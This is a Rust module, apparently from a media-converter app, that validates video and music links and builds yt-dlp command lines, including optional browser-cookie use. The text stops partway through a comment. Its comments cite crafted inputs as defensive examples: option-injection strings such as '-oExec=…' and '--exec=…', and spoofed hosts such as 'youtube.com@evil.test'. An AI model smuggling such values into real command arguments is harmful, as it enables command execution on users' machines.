//! Links as a source: a YouTube or Bilibili URL that becomes a file before the normal pipeline
//! ever sees it.
//!
//! Everything here is pure. It answers four questions and nothing else:
//!
//! * **is this a link we accept?** ([`Link::parse`]) - scheme, host and path are checked *before*
//!   the string is allowed anywhere near an argument vector, so a crafted `-oExec=…` can never be
//!   read as a flag by `yt-dlp`. There is no shell anywhere on this path, and the argv built here
//!   always puts the URL after a `--` separator as a second line of defence;
//! * **how many at once?** ([`check_batch_size`]) - the cap lives here rather than in the UI,
//!   because the UI is one of two callers and the untrusted one;
//! * **what do we run?** ([`fetch_args`], [`probe_args`]) - a fixed argv with our own bundled
//!   FFmpeg passed through `--ffmpeg-location`, the JavaScript runtime YouTube's challenges need
//!   passed through `--js-runtimes`, the cookie source the user chose (if any) passed through
//!   `--cookies-from-browser` or `--cookies`, and a format selector that fetches *audio only* when
//!   the target is audio (the difference between a 4 MB download and a 400 MB one);
//! * **what happened?** ([`parse_download_line`], [`parse_probe_output`], [`classify_failure`]) -
//!   progress, title/duration, and the handful of failures a user will actually hit, each with its
//!   own sentence.
//!
//! Refusals are deliberately specific. "That is a playlist" and "that is a channel" need different
//! actions from the person reading them, and a playlist silently expanding past the cap is exactly
//! the accident the cap exists to prevent.

use crate::format::{Category, Format, Tool};
use crate::plan::output_extension;
use crate::progress::parse_timestamp;
use crate::settings::CookieFlag;
use serde::Serialize;
use std::path::{Path, PathBuf};

/// Most links one batch may carry.
///
/// The webview enforces this too, for a message before the click rather than after it - but this
/// constant is the authority: [`check_batch_size`] is called by the IPC layer *and* by
/// [`crate::queue::run_batch`], so a payload that never went through the UI is still capped.
pub const MAX_LINKS_PER_BATCH: usize = 20;

/// The name yt-dlp writes its download under, inside the job's own scratch directory.
///
/// A fixed stem, not the video title: the title is used for the *result*, where the user sees it,
/// and a temp file named after arbitrary remote text is a needless second place to get escaping
/// wrong. The extension is whatever the site served (`%(ext)s`).
const DOWNLOAD_STEM: &str = "source";

/// The sites we accept, as a user names them.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize)]
#[serde(rename_all = "snake_case")]
pub enum LinkSite {
    YouTube,
    Bilibili,
    QQMusic,
    NetEase,
    SoundCloud,
    Bandcamp,
}

impl LinkSite {
    pub const fn id(self) -> &'static str {
        match self {
            LinkSite::YouTube => "youtube",
            LinkSite::Bilibili => "bilibili",
            LinkSite::QQMusic => "qqmusic",
            LinkSite::NetEase => "netease",
            LinkSite::SoundCloud => "soundcloud",
            LinkSite::Bandcamp => "bandcamp",
        }
    }

    pub const fn label(self) -> &'static str {
        match self {
            LinkSite::YouTube => "YouTube",
            LinkSite::Bilibili => "Bilibili",
            LinkSite::QQMusic => "QQ Music",
            LinkSite::NetEase => "NetEase Music",
            LinkSite::SoundCloud => "SoundCloud",
            LinkSite::Bandcamp => "Bandcamp",
        }
    }

    pub const fn category(self) -> Category {
        match self {
            Self::YouTube | Self::Bilibili => Category::Video,
            _ => Category::Audio,
        }
    }
}

impl std::fmt::Display for LinkSite {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(self.label())
    }
}

/// Every host that may reach an argument, exact match only.
///
/// Exact match is the whole point: `youtube.com.evil.test` ends with `youtube.com`, and
/// `y0utube.com` looks like it in a toast. A suffix check would accept both.
pub const ACCEPTED_HOSTS: &[(&str, LinkSite)] = &[
    ("youtube.com", LinkSite::YouTube),
    ("www.youtube.com", LinkSite::YouTube),
    ("m.youtube.com", LinkSite::YouTube),
    ("music.youtube.com", LinkSite::YouTube),
    ("youtu.be", LinkSite::YouTube),
    ("www.youtu.be", LinkSite::YouTube),
    ("bilibili.com", LinkSite::Bilibili),
    ("www.bilibili.com", LinkSite::Bilibili),
    ("m.bilibili.com", LinkSite::Bilibili),
    ("b23.tv", LinkSite::Bilibili),
    ("www.b23.tv", LinkSite::Bilibili),
    ("y.qq.com", LinkSite::QQMusic),
    ("music.163.com", LinkSite::NetEase),
    ("y.music.163.com", LinkSite::NetEase),
    ("soundcloud.com", LinkSite::SoundCloud),
    ("www.soundcloud.com", LinkSite::SoundCloud),
    ("m.soundcloud.com", LinkSite::SoundCloud),
];

/// A link that passed every check: the exact string we will hand to `yt-dlp`, and which site it is.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Link {
    url: String,
    site: LinkSite,
}

impl Link {
    /// The only constructor. Nothing else in the crate can make a `Link`, which is what makes
    /// "validated" a property of the type rather than of a call site somebody may forget.
    pub fn parse(raw: &str) -> Result<Link, LinkError> {
        let url = raw.trim();
        if url.is_empty() {
            return Err(LinkError::Empty);
        }
        // A URL with whitespace or a control character in it is not a URL - and it is exactly the
        // shape a paste of two links on one line takes.
        if url.chars().any(|c| c.is_whitespace() || c.is_control()) {
            return Err(LinkError::NotAUrl { shown: printable(url) });
        }
        if url.len() > 8192 || url.contains('\\') {
            return Err(LinkError::NotAUrl { shown: printable(url) });
        }
        let Some((scheme, rest)) = url.split_once("://") else {
            return Err(LinkError::NotAUrl { shown: printable(url) });
        };
        if !scheme.eq_ignore_ascii_case("http") && !scheme.eq_ignore_ascii_case("https") {
            return Err(LinkError::NotAUrl { shown: printable(url) });
        }
        let end = rest.find(['/', '?', '#']).unwrap_or(rest.len());
        let authority = &rest[..end];
        let remainder = &rest[end..];
        // `https://youtube.com@evil.test/x` is a link to evil.test. Credentials in a video URL are
        // never legitimate, so the whole shape is refused rather than parsed carefully.
        if authority.contains('@') {
            return Err(LinkError::Credentials);
        }
        let (host, port) = match authority.split_once(':') {
            Some((h, p)) => (h, Some(p)),
            None => (authority, None),
        };
        if let Some(port) = port {
            if !matches!(
                (scheme.to_ascii_lowercase().as_str(), port),
                ("https", "443") | ("http", "80")
            ) {
                return Err(LinkError::NotAUrl { shown: printable(url) });
            }
        }
        // A trailing dot is a legal FQDN and a classic allowlist bypass: `youtube.com.` resolves
        // exactly like `youtube.com` and would not match the table below.
        let host = host.trim_end_matches('.').to_ascii_lowercase();
        if host.is_empty() {
            return Err(LinkError::NotAUrl { shown: printable(url) });
        }
        if !host.chars().all(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-') {
            return Err(LinkError::UnknownHost { host: printable(&host) });
        }

        let (path, query) = split_path(remainder);
        // Said before the allowlist refusal, because "live.bilibili.com" is a recognisable place
        // and "that host is not on the list" would not tell the user what is wrong with it.
        if host.starts_with("live.") && ACCEPTED_HOSTS.iter().any(|(h, _)| host.ends_with(h)) {
            return Err(LinkError::Live);
        }
        // Bandcamp uses one artist subdomain, never an arbitrary suffix match.
        let artist = host.strip_suffix(".bandcamp.com").filter(|s| {
            !s.is_empty() && !s.contains('.') && !matches!(*s, "www" | "daily" | "get")
        });
        let site = ACCEPTED_HOSTS
            .iter()
            .find(|(h, _)| *h == host)
            .map(|(_, s)| *s)
            .or(artist.map(|_| LinkSite::Bandcamp));
        let Some(site) = site else {
            return Err(LinkError::UnknownHost { host: printable(&host) });
        };

        let (path, query) = if site == LinkSite::NetEase && remainder.starts_with("/#/") {
            split_path(&remainder[2..])
        } else {
            (path, query)
        };
        check_path(site, &host, &path, &query)?;
        Ok(Link { url: url.to_string(), site })
    }

    /// The URL as it will be passed to `yt-dlp` - already proven to start with `http`/`https`, so
    /// it can never be read as an option however it is placed.
    pub fn url(&self) -> &str {
        &self.url
    }

    pub fn site(&self) -> LinkSite {
        self.site
    }
}

/// Path and query of a URL, with the fragment dropped.
fn split_path(remainder: &str) -> (String, String) {
    let without_fragment = remainder.split('#').next().unwrap_or("");
    match without_fragment.split_once('?') {
        Some((path, query)) => (path.to_string(), query.to_string()),
        None => (without_fragment.to_string(), String::new()),
    }
}

/// Is this the URL of *one video*, on this site?
fn check_path(site: LinkSite, host: &str, path: &str, query: &str) -> Result<(), LinkError> {
    let trimmed = path.trim_end_matches('/');
    let first = trimmed.trim_start_matches('/').split('/').next().unwrap_or("").to_string();
    let rest = trimmed.trim_start_matches('/').split_once('/').map(|(_, r)| r).unwrap_or("");
    match site {
        LinkSite::QQMusic | LinkSite::NetEase | LinkSite::SoundCloud | LinkSite::Bandcamp => {
            let parsed = url::Url::parse(&format!("https://{host}{path}?{query}"))
                .map_err(|_| LinkError::NotATrackPage { site })?;
            let parts: Vec<_> = parsed.path().trim_matches('/').split('/').collect();
            let track = match site {
                LinkSite::QQMusic => {
                    parts.len() == 4
                        && parts[..3] == ["n", "ryqq", "songDetail"]
                        && parts[3].chars().all(|c| c.is_ascii_alphanumeric())
                        && !parts[3].is_empty()
                }
                LinkSite::NetEase => {
                    matches!(parsed.path(), "/song" | "/m/song")
                        && parsed.query_pairs().any(|(k, v)| {
                            k == "id" && !v.is_empty() && v.chars().all(|c| c.is_ascii_digit())
                        })
                }
                LinkSite::SoundCloud => {
                    (parts.len() == 2 || (parts.len() == 3 && parts[2].starts_with("s-")))
                        && parts.iter().all(|p| {
                            !p.is_empty()
                                && p.chars()
                                    .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
                        })
                        && !matches!(
                            parts[0],
                            "discover" | "search" | "you" | "stations" | "stream"
                        )
                        && !matches!(
                            parts[1],
                            "sets"
                                | "tracks"
                                | "albums"
                                | "likes"
                                | "reposts"
                                | "popular-tracks"
                                | "spotlight"
                                | "comments"
                        )
                }
                LinkSite::Bandcamp => {
                    parts.len() == 2
                        && parts[0] == "track"
                        && !parts[1].is_empty()
                        && parts[1]
                            .chars()
                            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_')
                }
                _ => false,
            };
            if track {
                Ok(())
            } else {
                Err(LinkError::NotATrackPage { site })
            }
        }
        LinkSite::YouTube if host.ends_with("youtu.be") => match first.as_str() {
            "" => Err(LinkError::NotAVideoPage { site }),
            "playlist" => Err(LinkError::Playlist),
            _ => Ok(()),
        },
        LinkSite::YouTube => match first.as_str() {
            // `watch?v=X&list=Y` is one video that happens to sit in a playlist, and `--no-playlist`
            // in `fetch_args` keeps it that way. A bare `/playlist?list=…` is the thing that would
            // quietly expand past the cap.
            "watch" => {
                if query_value(query, "v").is_some_and(|v| !v.is_empty()) {
                    Ok(())
                } else {
                    Err(LinkError::NotAVideoPage { site })
                }
            }
            "shorts" | "embed" if !rest.is_empty() => Ok(()),
            "live" => Err(LinkError::Live),
            "playlist" => Err(LinkError::Playlist),
            "channel" | "c" | "user" => Err(LinkError::Channel),
            other if other.starts_with('@') => Err(LinkError::Channel),
            _ => Err(LinkError::NotAVideoPage { site }),
        },
        LinkSite::Bilibili if host.ends_with("b23.tv") => {
            // A short link hides its destination, so the only check possible is "there is one".
            if first.is_empty() {
                Err(LinkError::NotAVideoPage { site })
            } else {
                Ok(())
            }
        }
        LinkSite::Bilibili => match first.as_str() {
            "video" if !rest.is_empty() => Ok(()),
            "medialist" | "playlist" | "watchlater" => Err(LinkError::Playlist),
            "space" => Err(LinkError::Channel),
            _ => Err(LinkError::NotAVideoPage { site }),
        },
    }
}

/// The value of one query parameter, undecoded (only its emptiness is ever inspected).
fn query_value<'a>(query: &'a str, key: &str) -> Option<&'a str> {
    query
        .split('&')
        .find_map(|pair| pair.split_once('=').filter(|(k, _)| *k == key).map(|(_, v)| v))
}

/// Why a pasted string is not something we will download.
///
/// Every variant says what to do instead: a refusal a user cannot act on is a dead end, and three
/// of these (playlist, channel, live) are things people paste constantly by accident.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
pub enum LinkError {
    #[error("Paste a video link first - the box is empty.")]
    Empty,
    #[error(
        "`{shown}` is not a link. Copy the address from your browser's address bar - it starts \
         with https://."
    )]
    NotAUrl { shown: String },
    #[error(
        "That link carries a username and password, which a video link never does. Copy the \
         address straight from your browser's address bar instead."
    )]
    Credentials,
    #[error(
        "The site `{host}` is not supported. Paste a YouTube, Bilibili, QQ Music, NetEase Music, \
         SoundCloud or artist.bandcamp.com single-track link. Spotify is not supported."
    )]
    UnknownHost { host: String },
    #[error("That is not a supported {site} single-track page. Open the track itself and copy its full web address; albums, playlists and short share links are not supported.")]
    NotATrackPage { site: LinkSite },
    #[error(
        "That is a playlist, not a video. Open the videos you want and paste their individual \
         links - up to 20 at a time."
    )]
    Playlist,
    #[error(
        "That is a channel, not a video. Open the videos you want and paste their individual \
         links - up to 20 at a time."
    )]
    Channel,
    #[error(
        "Live streams cannot be converted while they are running. Wait until the stream has \
         finished and paste the link to the recording."
    )]
    Live,
    #[error(
        "That is not a {} video page. Open the video itself and paste the link from the address \
         bar.",
        site.label()
    )]
    NotAVideoPage { site: LinkSite },
    #[error(
        "You pasted {count} links. Flint takes {max} at a time - remove {} and paste \
         them as a second batch.",
        count.saturating_sub(*max)
    )]
    TooMany { count: usize, max: usize },
}

/// The cap, as the core enforces it. `count` is echoed so the message names what it actually got.
pub fn check_batch_size(count: usize) -> Result<(), LinkError> {
    if count > MAX_LINKS_PER_BATCH {
        return Err(LinkError::TooMany { count, max: MAX_LINKS_PER_BATCH });
    }
    Ok(())
}

/// A crafted id or host echoed back into a message the UI renders.
///
/// Control characters would smuggle escape sequences into a toast and an unbounded string would
/// flood it, so both are cut here rather than at every `format!`.
fn printable(raw: &str) -> String {
    let cleaned: String = raw.chars().filter(|c| !c.is_control()).take(80).collect();
    if cleaned.trim().is_empty() {
        "(empty)".to_string()
    } else {
        cleaned
    }
}

// ---------------------------------------------------------------------------------------------
// Naming
// ---------------------------------------------------------------------------------------------

/// Longest filename stem we take from a remote title.
///
/// Titles run to hundreds of characters and macOS stops at 255 *bytes* per component - which a CJK
/// title reaches in 85 characters, before the extension and any ` (1)` the conflict policy adds.
const MAX_TITLE_CHARS: usize = 80;

/// Names Windows refuses whatever the extension. Cheap to avoid, and this crate is deliberately
/// platform-independent.
const RESERVED_NAMES: &[&str] = &[
    "CON", "PRN", "AUX", "NUL", "COM1", "COM2", "COM3", "COM4", "COM5", "COM6", "COM7", "COM8",
    "COM9", "LPT1", "LPT2", "LPT3", "LPT4", "LPT5", "LPT6", "LPT7", "LPT8", "LPT9",
];

/// A video title turned into a filename stem that cannot surprise the filesystem.
///
/// What it must survive, all of them real: an empty title, a title that is only punctuation, one
/// containing `/` (which would silently become a directory), a leading `-`, a leading `.` (an
/// invisible file), 300 characters, and CJK or emoji - which are perfectly good filenames and are
/// kept as they are.
pub fn sanitize_title(title: &str) -> String {
    let mut out = String::new();
    for ch in title.chars() {
        let mapped = match ch {
            // Separators and the Windows-reserved set. `:` is a separator in Finder's eyes too.
            '/' | '\\' | ':' | '*' | '?' | '"' | '<' | '>' | '|' => '-',
            c if c.is_control() => ' ',
            c => c,
        };
        // Collapse runs, so `a///b` is `a-b` rather than `a---b`.
        let last = out.chars().last();
        if (mapped == '-' && last == Some('-')) || (mapped == ' ' && last == Some(' ')) {
            continue;
        }
        out.push(mapped);
    }
    let mut out: String = out.trim().chars().take(MAX_TITLE_CHARS).collect();
    // Four-byte Unicode characters exceed filesystem limits before the character cap.
    while out.len() > 240 {
        out.pop();
    }
    // A leading `-` is a filename that command line tools read as an option, and a leading `.` is
    // a file Finder does not show. A trailing dot or space is stripped by Windows behind our back.
    out = out.trim_matches(|c: char| c == '-' || c == '.' || c.is_whitespace()).to_string();
    if out.is_empty() {
        return "video".into();
    }
    let stem = out.split('.').next().unwrap_or(&out);
    if RESERVED_NAMES.iter().any(|r| stem.trim_end().eq_ignore_ascii_case(r)) {
        out.insert_str(stem.len(), "-video");
    }
    out
}

// ---------------------------------------------------------------------------------------------
// Command lines
// ---------------------------------------------------------------------------------------------

/// Everything the fetch step needs that is not in the [`Link`] itself.
#[derive(Debug, Clone)]
pub struct FetchOptions {
    /// Our bundled FFmpeg. yt-dlp needs one to merge separate video and audio streams, and the
    /// user must not have to install a second copy of something the app already ships.
    pub ffmpeg: Option<PathBuf>,
    /// The JavaScript runtime discovery found, if this machine has one. `None` is a working command
    /// line with a degraded extraction behind it - see [`JsRuntime`] for what that costs.
    pub js_runtime: Option<JsRuntime>,
    /// The job's own scratch directory. Everything the fetch writes lands in here and nowhere else,
    /// which is what makes "a cancelled fetch leaves no partial file" one `remove_dir_all`.
    pub dir: PathBuf,
    /// True when the target is audio: fetch the audio stream on its own instead of pulling a whole
    /// video and throwing the picture away.
    pub audio_only: bool,
    /// The sign-in the user chose to lend this fetch, already checked (see
    /// [`crate::settings::LinkSettings::effective`]). `None` is the default and means no cookie
    /// flag at all.
    pub cookies: Option<CookieFlag>,
}

impl FetchOptions {
    /// The four things the queue knows: where the job's scratch is, what it is converting to, which
    /// of our own helpers yt-dlp is to be handed, and whose sign-in it may use.
    pub fn for_target(
        dir: PathBuf,
        target: &Format,
        ffmpeg: Option<PathBuf>,
        js_runtime: Option<JsRuntime>,
        cookies: Option<CookieFlag>,
    ) -> Self {
        Self { ffmpeg, js_runtime, dir, audio_only: is_audio_only(target), cookies }
    }
}

/// The JavaScript runtime yt-dlp is told to use, by absolute path.
///
/// This exists because of one measured failure. yt-dlp needs an external JS runtime to solve
/// YouTube's challenges and looks for one on `PATH` only; a Finder-launched macOS app inherits
/// `/usr/bin:/bin:/usr/sbin:/sbin`, so it finds none, warns "No supported JavaScript runtime could
/// be found", falls back to the deprecated no-runtime extraction - and YouTube answers *that* with
/// "Sign in to confirm you're not a bot". The user is signed out of nothing. Naming the runtime by
/// absolute path is the whole cure: in the same minimal environment,
/// `--js-runtimes deno:/opt/homebrew/bin/deno` restores "Solving JS challenges using deno".
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct JsRuntime {
    /// yt-dlp's own name for the runtime (`deno`, `node`), which is the left half of the flag.
    name: &'static str,
    /// Absolute path to the binary, as discovery found it.
    path: PathBuf,
}

impl JsRuntime {
    /// The runtime a discovered helper *is*, or `None` for a tool yt-dlp knows nothing about -
    /// which is what stops a future helper from being passed as a runtime it cannot be.
    pub fn new(tool: Tool, path: PathBuf) -> Option<Self> {
        tool.js_runtime_name().map(|name| Self { name, path })
    }

    /// yt-dlp's name for this runtime, as `--js-runtimes` spells it.
    pub fn name(&self) -> &'static str {
        self.name
    }

    pub fn path(&self) -> &Path {
        &self.path
    }

    /// The `--js-runtimes` value: `deno:/opt/homebrew/bin/deno`. yt-dlp accepts either the binary
    /// or its containing directory after the colon; the binary is what we know for certain.
    pub fn flag_value(&self) -> String {
        format!("{}:{}", self.name, self.path.display())
    }

    /// The directory the runtime lives in, for the child `PATH` (see [`crate::tools::child_path`]).
    pub fn dir(&self) -> Option<&Path> {
        self.path.parent()
    }
}

/// Does this target need the picture at all?
pub fn is_audio_only(target: &Format) -> bool {
    target.category == Category::Audio
}

/// yt-dlp's format selector.
///
/// `bestaudio*` is the whole reason this function exists: converting a 40 minute talk to MP3 must
/// download the ~4 MB audio stream, not the 400 MB video it belongs to. `/best` is the fallback for
/// the handful of sites (and older Bilibili pages) that only offer muxed streams.
pub fn format_selector(audio_only: bool) -> &'static str {
    if audio_only {
        "bestaudio*/best"
    } else {
        "bestvideo*+bestaudio/best"
    }
}

/// The output template: a fixed stem in the job's scratch, with the site's own extension.
pub fn output_template(dir: &Path) -> String {
    dir.join(format!("{DOWNLOAD_STEM}.%(ext)s")).to_string_lossy().to_string()
}

/// The argv for the fetch phase.
///
/// The URL comes last, after `--`: it has already been proven to start with `http`/`https` by
/// [`Link::parse`], and the separator means even a future change to that check cannot turn a URL
/// into an option. There is no shell - this vector is passed to `Command::args` verbatim.
pub fn fetch_args(link: &Link, options: &FetchOptions) -> Vec<String> {
    let mut args: Vec<String> = vec![
        "--ignore-config".into(),
        // One video, whatever list it belongs to. Also the backstop for the cap: a link that turns
        // out to be a playlist downloads one file, not two hundred.
        "--no-playlist".into(),
        "--playlist-items".into(),
        "1".into(),
        "--socket-timeout".into(),
        "15".into(),
        // Write the file directly rather than a `.part` we then have to know about.
        "--no-part".into(),
        // Progress as whole lines instead of a carriage-return animation nothing can parse.
        "--newline".into(),
        // The default is ten, which turns "the network is down" into a five minute hang.
        "--retries".into(),
        "3".into(),
    ];
    if let Some(ffmpeg) = &options.ffmpeg {
        args.push("--ffmpeg-location".into());
        args.push(ffmpeg.to_string_lossy().to_string());
    }
    args.extend(js_runtime_args(options.js_runtime.as_ref()));
    args.extend(cookie_args(options.cookies.as_ref()));
    if link.site().category() == Category::Audio {
        args.extend([
            "--embed-metadata".into(),
            "--match-filter".into(),
            "!is_live & !is_drm".into(),
        ]);
    }
    args.push("-f".into());
    args.push(if link.site().category() == Category::Audio {
        "bestaudio[format_id!*=preview]/best[format_id!*=preview]".into()
    } else {
        format_selector(options.audio_only).into()
    });
    args.push("-o".into());
    args.push(output_template(&options.dir));
    args.push("--".into());
    args.push(link.url().to_string());
    args
}

/// `--js-runtimes deno:/opt/homebrew/bin/deno`, or nothing at all.
///
/// By absolute path for the same reason as `--ffmpeg-location` above: yt-dlp would otherwise look
/// for the runtime on a `PATH` that a Finder-launched app does not have, decide it has none, and
/// fall back to an extraction YouTube refuses. When there is no runtime the flag is left out
/// entirely rather than passed empty - `--js-runtimes deno` alone would only re-enable the default
/// yt-dlp already has, and pretend we had found something.
fn js_runtime_args(runtime: Option<&JsRuntime>) -> Vec<String> {
    match runtime {
        Some(runtime) => vec!["--js-runtimes".into(), runtime.flag_value()],
        None => Vec::new(),
    }
}

/// `--cookies-from-browser safari`, `--cookies /Users/me/cookies.txt`, or nothing at all.
///
/// Three states, one flag each, and the default emits none: a fetch that was not asked to borrow a
/// sign-in must be indistinguishable from one made by a build that has no such setting.
///
/// Note what the browser arm pushes: the `&'static str` carried by [`CookieFlag::Browser`], which
/// came out of `settings::COOKIE_BROWSERS` and cannot be the string the webview sent. That is the
/// whole reason [`CookieFlag`] is a separate type from the setting, and it is what keeps
/// `chrome:Profile 2`, `chrome+gnomekeyring` and `--exec=…` out of this vector without a single
/// escaping decision being made here.
fn cookie_args(cookies: Option<&CookieFlag>) -> Vec<String> {
    match cookies {
        Some(CookieFlag::Browser(name)) => {
            vec!["--cookies-from-browser".into(), (*name).to_string()]
        }
        // Absolute by construction, so it cannot be read as an option and cannot depend on the
        // directory the app was launched from.
        Some(CookieFlag::File(path)) => {
            vec!["--cookies".into(), path.to_string_lossy().to_string()]
        }
        None => Vec::new(),
    }
}

/// The argv for the probe: title and duration, no download.
///
/// Two `--print` templates rather than one, so a title containing whatever the uploader felt like
/// typing cannot be mistaken for the duration line - the first line is the title, the last is the
/// duration.
///
/// The runtime is passed here too: a probe reads the same challenged page a fetch does, so without
/// it the *first* thing a pasted link does is fail with the site's bot check. The cookies are
/// passed for the same reason and it is not a nicety: a members-only or age-restricted page refuses
/// the *probe*, so a link with a perfectly good cookie source behind it would fail before the
/// download it would have succeeded at.
pub fn probe_args(
    link: &Link,
    js_runtime: Option<&JsRuntime>,
    cookies: Option<&CookieFlag>,
) -> Vec<String> {
    let mut args: Vec<String> = vec![
        "--ignore-config".into(),
        "--no-playlist".into(),
        "--playlist-items".into(),
        "1".into(),
        "--skip-download".into(),
        "--socket-timeout".into(),
        "10".into(),
        "--retries".into(),
        "0".into(),
    ];
    args.extend(js_runtime_args(js_runtime));
    args.extend(cookie_args(cookies));
    if link.site().category() == Category::Audio {
        args.extend([
            "--print".into(),
            "%(.{title,duration,formats,is_live,live_status,availability,_type})j".into(),
            "--".into(),
            link.url().to_string(),
        ]);
        return args;
    }
    args.extend([
        "--no-warnings".into(),
        "--print".into(),
        "%(title)s".into(),
        "--print".into(),
        "%(duration)s".into(),
        "--".into(),
        link.url().to_string(),
    ]);
    args
}

/// What a probe told us about a link, before anything is downloaded.
#[derive(Debug, Clone, Default, PartialEq)]
pub struct LinkInfo {
    /// The remote title, exactly as the site spells it. [`sanitize_title`] is what turns it into a
    /// filename; keeping the raw string here means the UI can show the real thing.
    pub title: String,
    pub duration_secs: Option<f64>,
}

/// A music probe must prove that it found a complete track, not silently accept
/// a playlist, a DRM-only entry or a 30-second preview as the requested song.
pub fn parse_music_probe(text: &str) -> Result<LinkInfo, String> {
    let value: serde_json::Value = text
        .lines()
        .rev()
        .find_map(|line| {
            serde_json::from_str::<serde_json::Value>(line).ok().filter(|v| v.is_object())
        })
        .ok_or("The music helper returned unreadable metadata. Update yt-dlp and try again.")?;
    if matches!(value["_type"].as_str(), Some("playlist" | "multi_video"))
        || value["is_live"].as_bool() == Some(true)
        || matches!(value["live_status"].as_str(), Some("is_live" | "is_upcoming"))
    {
        return Err(
            "This link is not a single completed track. Open the track's own page and try again."
                .into(),
        );
    }
    let formats = value["formats"]
        .as_array()
        .ok_or("No playable audio was provided. Check access on the source site, then retry.")?;
    let full_audio = formats.iter().any(|f| {
        let description = format!(
            "{} {} {}",
            f["format_id"].as_str().unwrap_or(""),
            f["format_note"].as_str().unwrap_or(""),
            f["url"].as_str().unwrap_or("")
        )
        .to_ascii_lowercase();
        f["has_drm"].as_bool() != Some(true)
            && f["vcodec"].as_str() == Some("none")
            && f["url"]
                .as_str()
                .is_some_and(|u| u.starts_with("https://") || u.starts_with("http://"))
            && !description.contains("preview")
            && !description.contains("/0/30/")
    });
    if !full_audio {
        return Err("Only a preview or protected audio is available. Check your access on the source site, or convert an authorized local file. No preview was converted.".into());
    }
    let title = value["title"]
        .as_str()
        .filter(|s| !s.trim().is_empty())
        .ok_or("The source returned no track title. Update yt-dlp and retry.")?
        .to_string();
    let duration_secs = value["duration"].as_f64().filter(|d| d.is_finite() && *d > 0.0);
    Ok(LinkInfo { title, duration_secs })
}

pub fn incomplete_music(expected: Option<f64>, actual: Option<f64>) -> bool {
    matches!((expected, actual), (Some(e), Some(a)) if e.is_finite() && a.is_finite()
        && e > 0.0 && a + (e * 0.02).max(2.0) < e)
}

/// Read [`probe_args`] output: title on the first line, duration on the last.
///
/// The *last* line, not the second. `--print` implies `--quiet`, but "quiet" has never meant
/// "silent": a deprecation notice, an `--update` hint or a plugin's banner lands on the same
/// stdout, and reading a fixed line number turns any one of them into a video of unknown length -
/// an indeterminate bar and no ETA on a link yt-dlp told us all about. Anchoring both ends instead
/// (first line, last line) is what makes the parse survive a line nobody predicted between them.
pub fn parse_probe_output(text: &str) -> LinkInfo {
    let lines: Vec<&str> = text.lines().map(str::trim).collect();
    let title = lines.first().copied().unwrap_or("").to_string();
    // yt-dlp prints `NA` for a duration it does not know (some live recordings, some Bilibili
    // pages). An unknown duration is not an error - the progress bar simply stays indeterminate.
    //
    // Only ever looked for *after* the title: a one-line answer is a title, and a title of "2024"
    // is not a 34 minute video.
    let duration_secs = lines
        .iter()
        .skip(1)
        .rev()
        .find(|line| !line.is_empty())
        .and_then(|d| d.parse::<f64>().ok())
        .filter(|d| *d > 0.0 && d.is_finite());
    LinkInfo { title, duration_secs }
}

/// One line of yt-dlp download progress.
#[derive(Debug, Clone, Copy, PartialEq)]
pub struct DownloadSample {
    /// 0..1.
    pub fraction: f32,
    pub eta_secs: Option<f64>,
}

/// Parse `[download]  42.3% of 10.00MiB at 1.20MiB/s ETA 00:07`, and nothing else.
///
/// Deliberately narrow: yt-dlp prints destinations, merge notices and extractor chatter on the same
/// stream, and a loose "find a number followed by %" would happily read the `100%` out of a video
/// title.
pub fn parse_download_line(line: &str) -> Option<DownloadSample> {
    let rest = line.trim().strip_prefix("[download]")?.trim_start();
    let percent = rest.split_whitespace().next()?.strip_suffix('%')?;
    let fraction = percent.parse::<f32>().ok()? / 100.0;
    if !fraction.is_finite() {
        return None;
    }
    // `Unknown` and `N/A` are yt-dlp's two ways of saying it has no idea yet; `parse_timestamp`
    // answers `None` to both, which is what leaves the row's ETA blank instead of "0s".
    let eta_secs =
        rest.split_whitespace().skip_while(|w| *w != "ETA").nth(1).and_then(parse_timestamp);
    Some(DownloadSample { fraction: fraction.clamp(0.0, 1.0), eta_secs })
}

/// Why a fetch failed, in words the person who pasted the link can act on.
///
/// One generic "download failed" was the alternative, and it is useless: "this video is private"
/// and "your network is down" call for completely different next steps, and "yt-dlp is out of date"
/// is the one failure the user can fix in ten seconds if they are told which one it is.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
pub enum FetchFailure {
    #[error(
        "yt-dlp is not installed. Open Settings → Helpers and install it (one click), then try \
         again."
    )]
    NotInstalled,
    #[error("This video has been removed, or the link points at something that no longer exists.")]
    Removed,
    #[error("This video is private. Only its owner can download it.")]
    Private,
    #[error(
        "This video is age-restricted, so it cannot be downloaded without signing in to the site."
    )]
    AgeRestricted,
    #[error("This video is not available in your country.")]
    GeoBlocked,
    /// A sign-in wall, hit with no cookie source configured. Now that the setting exists, this
    /// message's job is to name it rather than to promise it.
    #[error(
        "The site wants a sign-in before it will hand this video over. Open Settings → Links and \
         let Flint borrow the sign-in from your browser, or point it at a cookies.txt \
         file you exported yourself."
    )]
    LoginRequired,
    /// The same wall, hit *with* a cookie source configured, **and with that source read**.
    ///
    /// Repeating "turn on the cookie setting" at somebody who already has is the dead end this
    /// whole change is about, one step further along: the cookies were sent and the site was not
    /// satisfied, so what is left is a stale jar, the wrong browser profile, or an account without
    /// access to this particular video. All three are things the user can check; none of them is
    /// "enable the setting".
    ///
    /// What this must *not* absorb is a jar that was never opened - see
    /// [`FetchFailure::BrowserCookiesUnreadable`], which is a different event with a different fix
    /// and used to be folded in here.
    #[error(
        "The site would not accept the sign-in Flint borrowed. Sign in to the site \
         again in that browser and retry, or export a fresh cookies.txt - the cookies it was given \
         have most likely expired, or belong to an account without access to this video."
    )]
    CookiesNotAccepted,
    /// The browser's cookie jar could not be opened at all, so the fetch went out with no sign-in
    /// whatever the settings page says.
    ///
    /// Measured, with yt-dlp 2026.08.19 and a browser that is not installed:
    ///
    /// ```text
    /// ERROR: could not find chrome cookies database in "/Users/…/Library/Application Support/Google/Chrome"
    /// ```
    ///
    /// This used to be classified as [`FetchFailure::CookiesNotAccepted`], which told the user
    /// their sign-in had expired when in truth it had never been read - and sent them to sign in
    /// again in a browser that would have made no difference. The two macOS permission cases that
